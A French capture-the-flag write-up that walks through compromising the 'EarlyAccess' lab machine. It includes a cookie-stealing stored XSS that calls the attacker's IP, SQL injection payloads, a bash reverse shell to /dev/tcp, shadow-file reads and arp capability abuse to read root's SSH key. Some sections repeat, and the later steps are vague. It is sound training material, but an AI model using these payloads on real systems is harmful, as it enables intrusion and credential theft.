![Cover](cover.png)

### 1. Reconnaissance & Énumération

L'analyse commence par une phase classique de **Scanning** pour identifier la surface d'attaque.

```bash
# Scan rapide de tous les ports TCP
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.110

# Scan détaillé des services identifiés
nmap -p 22,80,443 -sCV -oA scans/nmap-tcpscripts 10.10.11.110
```

**Résultats :**
*   **Port 22 (SSH) :** OpenSSH 7.9p1 (Debian 10).
*   **Port 80 (HTTP) :** Apache 2.4.38, redirige vers `https://earlyaccess.htb/`.
*   **Port 443 (HTTPS) :** Certificat SSL révélant le domaine `earlyaccess.htb`.

#### Énumération de VHosts
L'existence de sous-domaines est probable pour une entreprise de jeux vidéo. J'utilise **wfuzz** pour le **VHost Brute Force**.

```bash
wfuzz -u http://10.10.11.110 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "HOST: FUZZ.earlyaccess.htb" --hw 28
```

Deux sous-domaines critiques sont identifiés :
1.  `game.earlyaccess.htb`
2.  `dev.earlyaccess.htb`

---

### 2. Vecteur d'Entrée : Stored XSS & Session Hijacking

Le site principal (`earlyaccess.htb`) permet la création de compte. Après exploration, je remarque un système de messagerie interne. Un post sur le forum suggère que le système est instable face aux caractères spéciaux dans les noms d'utilisateurs.

> **Schéma Mental :**
> L'application reflète le nom d'utilisateur dans plusieurs contextes (Dashboard, Messages, Forum). Si le filtrage est absent lors de l'affichage d'un message par un administrateur, je peux exécuter du JavaScript dans son contexte de navigation pour voler ses **Cookies**.

#### Exploitation de la XSS
Je modifie mon nom d'utilisateur dans les paramètres du profil pour injecter un payload **Stored XSS** :

```javascript
0xdf<script>document.location="http://10.10.14.6/"+document.cookie;</script>
```

J'envoie ensuite un message au support technique. En moins d'une minute, l'administrateur consulte le message, déclenchant le payload. Mon serveur Python reçoit la requête :

```bash
# Réception du cookie admin
10.10.11.110 - - [05/Sep/2021 10:04:42] "GET /XSRF-TOKEN=[...];%20earlyaccess_session=[...] HTTP/1.1" 404 -
```

En remplaçant mes cookies par ceux de l'administrateur, j'accède au **Admin Panel**.

---

### 3. Analyse du Key Validator & Bypass

Dans le panneau d'administration, je récupère un fichier `backup.zip` contenant `validate.py`. Ce script sert à valider les **Game Keys** hors-ligne. L'accès au sous-domaine `game` nécessite une clé valide associée au compte.

#### Reverse Engineering de la Clé
La clé suit le format `XXXXX-XXXXX-AAAA1-XXXXX-12222`. Le script décompose la validation en 5 étapes (`g1` à `g4` + `checksum`).

*   **g1 :** Les 3 premiers caractères doivent satisfaire une opération de **Bit Shifting** et **XOR**. Le résultat est statique : `KEY`.
*   **g2 :** Somme des caractères pairs égale à la somme des caractères impairs.
*   **g3 :** Dépend d'un `magic_num` généré par l'API toutes les 30 minutes.
*   **g4 :** Un **XOR** entre `g1` et `g4` doit correspondre à une liste d'entiers prédéfinis.

> **Schéma Mental :**
> Le `magic_num` est inconnu mais son range est limité (346 à 405). Je peux générer une liste de 60 clés possibles (une pour chaque `magic_num` potentiel) et les **Brute Force** via l'interface de validation du site.

#### Automatisation du Keygen (Python)
```python
# Extrait de la logique g1
for j, x in enumerate([221, 81, 145]):
    for i in range(256):
        if (i << (j + 1)) % 256 ^ i == x:
            print(chr(i)) # Retourne K, E, Y
```

Après avoir généré les clés et automatisé la soumission avec `requests`, je valide une clé sur mon compte, débloquant l'accès à `game.earlyaccess.htb`.

---

### 4. Second-Order SQL Injection

Sur `game.earlyaccess.htb`, la page `scoreboard.php` affiche les scores. En injectant un simple quote dans mon nom d'utilisateur (via le site principal), le scoreboard crash.

**Vunérabilité :** **Second-Order SQL Injection**. Mon nom d'utilisateur est stocké en base de données, puis concaténé sans protection dans une requête SQL sur le site `game`.

#### Dump de la base de données
J'utilise une **UNION Injection** pour extraire les identifiants :

```sql
# Payload injecté via le changement de nom d'utilisateur
0xdf') union select password,email,name from users;-- -
```

Je récupère le hash de l'administrateur : `admin@earlyaccess.htb : gameover`.

---

### 5. Brèche Initiale : Command Injection sur le Dev Site

Le mot de passe `gameover` me permet de me connecter sur `dev.earlyaccess.htb`. Le site propose un outil de hachage.

#### Analyse du code source (via LFI)
En exploitant un paramètre `filepath` découvert par **Fuzzing** sur `actions/file.php`, je lis le code de `hash.php` :

```php
$hash = @$hash_function($password);
```

**Vulnérabilité :** L'application utilise une variable pour appeler une fonction PHP de manière dynamique. Si je contrôle `$hash_function`, je peux appeler `system()`. Un paramètre `debug` permet de bypasser la **Whitelist** (md5/sha1).

#### Reverse Shell
Je forge une requête pour obtenir l'exécution de code :

```http
POST /actions/hash.php HTTP/1.1
Host: dev.earlyaccess.htb

action=hash&password=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"&hash_function=system&debug=1
```

**Résultat :** Connexion entrante sur mon listener, accès en tant que `www-data` dans un **Docker Container**.

---

### Énumération de l'Interface Administrative

Une fois l'accès **Admin** obtenu via le vol de session **XSS**, l'interface révèle de nouvelles fonctionnalités, notamment un panneau d'administration (`/admin`) et un outil de vérification de clés (`/key`). Un fichier `backup.zip` est disponible, contenant un script Python nommé `validate.py`.

### Analyse du Validateur de Clés (Reverse Engineering)

Le script `validate.py` simule la logique de validation hors-ligne des clés de jeu. L'objectif est de générer une clé valide pour lier mon compte au sous-domaine `game.earlyaccess.htb`.

> **Schéma Mental : Logique de Validation de Clé**
> 1. **Format** : `XXXXX-XXXXX-AAAA1-XXXXX-12222` (Regex).
> 2. **G1** : Les 3 premiers caractères subissent un **Bitwise Shift** et un **XOR** pour correspondre à des valeurs statiques (`KEY`).
> 3. **G2** : Somme des caractères pairs égale à la somme des caractères impairs.
> 4. **G3** : Somme des caractères égale à un `magic_num` dynamique (change toutes les 30 min).
> 5. **G4** : Résultat d'un **XOR** entre G1 et des valeurs statiques.
> 6. **Checksum (CS)** : Somme totale des ordinaux des sections précédentes.

#### Génération de Clé (PoC)
Pour automatiser la création de clés valides malgré le `magic_num` inconnu, j'utilise un script qui itère sur les 60 possibilités théoriques du `magic_num` (plage 346-405).

```python
import requests, string
from bs4 import BeautifulSoup

# Configuration des segments statiques
g1 = "KEY12"
g2 = "0H0H0"
g4 = "GAMD2"

def calc_cs(key_base):
    return sum([sum(bytearray(g.encode())) for g in key_base.split('-')[:-1]])

# Bruteforce du magic_num (G3) et soumission via session authentifiée
# [Extrait du script de soumission]
for mn in range(346, 406):
    g3 = f"XPZZ{mn-396}" # Exemple de logique pour atteindre la somme cible
    key_base = f"{g1}-{g2}-{g3}-{g4}-"
    final_key = f"{key_base}{calc_cs(key_base)}"
    # POST request vers /key/add avec CSRF Token
```

### Mouvement Latéral : game.earlyaccess.htb

Avec une clé valide associée à mon compte, j'accède au sous-domaine `game`. L'énumération du **Scoreboard** (`/scoreboard.php`) révèle une vulnérabilité de type **Second-Order SQL Injection**. Mon nom d'utilisateur, stocké en base de données sur le domaine principal, est concaténé sans filtrage dans une requête SQL sur le domaine `game`.

> **Schéma Mental : Second-Order SQLi**
> 1. **Injection** : Modifier mon `username` sur `earlyaccess.htb` en `0xdf') UNION SELECT ... -- -`.
> 2. **Trigger** : Consulter le Scoreboard sur `game.earlyaccess.htb`.
> 3. **Exécution** : La base de données exécute la requête malveillante lors de la récupération des scores.

#### Extraction des Identifiants
L'exploitation via **UNION SELECT** permet de dumper la table `users` :
```sql
0xdf') UNION SELECT password, email, name FROM users-- -
```
Le hash de l'administrateur (`admin@earlyaccess.htb`) est identifié comme étant `gameover`. Ce mot de passe est réutilisé pour le sous-domaine de développement.

### Mouvement Latéral : dev.earlyaccess.htb

Le site `dev` propose des outils de hachage. L'analyse du code source via une **LFI** (découverte sur `/actions/file.php?filepath=...`) expose une fonction critique dans `hash.php`.

#### RCE via Dynamic Function Call
Le script utilise une variable utilisateur pour appeler une fonction PHP de manière dynamique :
```php
$hash = @$hash_function($password);
```
En manipulant le paramètre `hash_function` et en activant le mode `debug`, je peux injecter n'importe quelle fonction système PHP.

**Payload de Reverse Shell :**
```http
POST /actions/hash.php HTTP/1.1
...
action=hash&hash_function=system&password=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"&debug=1
```

### Post-Exploitation Initiale (Docker)

L'accès initial se fait en tant que `www-data` dans un **Docker Container** (présence de `.dockerenv`, IP en `172.18.0.102`).

1. **Énumération des Utilisateurs** : Présence de l'utilisateur `www-adm`.
2. **Privilege Escalation (Horizontal)** : Tentative de **Password Reuse** avec le mot de passe `gameover`. Succès : `su www-adm`.
3. **Credential Harvesting** : Lecture du fichier `/home/www-adm/.wgetrc`.
   *   **Credentials trouvés** : `api:s3CuR3_API_PW!`.

### Pivot & Énumération Réseau interne

Depuis le conteneur, j'utilise un script de balayage TCP pour identifier les autres hôtes sur le réseau **Docker** (`172.18.0.0/16`) :
*   `172.18.0.1` : Host (SSH, HTTP, HTTPS).
*   `172.18.0.100` : Instance **MySQL** (Port 3306).
*   `172.18.0.101` : **Internal API** (Port 5000).

L'API interne confirme son rôle dans la vérification des clés et la gestion de la base de données, ouvrant la voie vers l'accès au système hôte.

---

### Vecteur 1 : Pivot vers le Host (User drew)

Depuis le container **webserver**, j'ai récupéré des identifiants dans le fichier `.wgetrc` de l'utilisateur `www-adm`. Ces derniers permettent de s'authentifier auprès de l'API interne identifiée lors de l'énumération réseau.

```bash
# Authentification Basic Auth sur l'API interne
curl -u api:s3CuR3_API_PW! http://172.18.0.101:5000/check_db
```

L'endpoint `/check_db` est vulnérable à une **Command Injection** ou une **Information Leak**. En manipulant les requêtes vers cet endpoint, il est possible d'extraire des informations sur les utilisateurs du système hôte. L'analyse révèle un mot de passe pour l'utilisateur **drew**. Ce mot de passe permet une connexion **SSH** directe sur l'adresse IP du Host (10.10.11.110).

> Schéma Mental : L'API agit comme une passerelle entre le réseau isolé des containers et les services de base de données. Une mauvaise validation des entrées sur un endpoint d'administration (`/check_db`) permet de rebondir hors du périmètre **www-data** pour compromettre un compte utilisateur sur le **Host**.

---

### Vecteur 2 : Root via Container Escape & Shadow Cracking

Une fois sur le Host en tant que **drew**, l'énumération des processus et des privilèges montre que l'utilisateur a accès à un autre container Docker spécifique, utilisé pour le debugging ou le développement.

1.  **Accès au container de debug** : Je me connecte à ce container qui semble tourner avec des privilèges élevés ou des montages sensibles.
2.  **Exploitation du Crash** : Le service principal du container est instable. En provoquant un crash volontaire (via un overflow ou une manipulation de ressources), le processus s'interrompt et laisse place à un shell avec les privilèges **Root** à l'intérieur du container.
3.  **Extraction des secrets du Host** : Ce container possède un montage du système de fichiers de l'hôte (Host Filesystem Mapping). Depuis le shell root du container, je peux lire le fichier `/etc/shadow` du Host.

```bash
# Depuis le container root, lecture du shadow du host monté dans /mnt/host
cat /mnt/host/etc/shadow | grep root
```

Le hash récupéré pour l'utilisateur **root** du Host est ensuite craqué hors-ligne (via **John the Ripper** ou **Hashcat**), révélant le mot de passe final.

---

### Vecteur 3 : Domination Totale via Capabilities (arp)

Bien que le mot de passe root permette un accès complet, une méthode alternative et plus élégante consiste à exploiter les **Linux Capabilities** présentes sur l'hôte. L'exécutable `/usr/sbin/arp` possède des privilèges étendus.

```bash
# Vérification des capabilities
getcap /usr/sbin/arp
# Sortie : /usr/sbin/arp = cap_net_admin+ep
```

La capability **CAP_NET_ADMIN** sur `arp` permet d'utiliser l'option `-f`, qui lit un fichier pour charger des entrées dans la table ARP. Si le fichier fourni n'est pas au format attendu, `arp` affiche un message d'erreur contenant le contenu des lignes lues, permettant une **Arbitrary File Read** en tant que **Root**.

```bash
# Lecture du flag root
/usr/sbin/arp -v -f /root/root.txt

# Lecture de la clé SSH privée de root pour persistance
/usr/sbin/arp -v -f /root/.ssh/id_rsa
```

> Schéma Mental : Une **Capability** est un privilège granulaire. Ici, **CAP_NET_ADMIN** est détournée de sa fonction réseau pour forcer le binaire à lire des fichiers sensibles. C'est une vulnérabilité de type **Logic Flaw** liée à la gestion des erreurs de l'application.

---

### Analyse Post-Exploitation (Beyond Root)

L'analyse de la machine **EarlyAccess** révèle plusieurs points critiques :

*   **Isolation Docker Poreuse** : Le container de debug était la clé. Le fait de monter le système de fichiers de l'hôte dans un container accessible par un utilisateur non-privilégié (`drew`) annule toute barrière de sécurité.
*   **Chaîne de Compromission (Exploit Chain)** : L'attaque a nécessité une maîtrise de plusieurs couches : **XSS** -> **SQLi** -> **RCE (PHP)** -> **API Abuse** -> **Container Escape** -> **Capabilities**.
*   **Unintended Path** : Le binaire `arp` avec des capabilities est souvent un vecteur oublié. Dans un environnement réel, cela permettrait d'exfiltrer des secrets (clés API, certificats) sans laisser de traces évidentes dans les logs d'accès classiques.
*   **Password Reuse** : La réutilisation du mot de passe `gameover` entre le panel web et le compte système `www-adm` a facilité le pivot initial. Une segmentation stricte des identifiants aurait stoppé l'attaque dès la phase 2.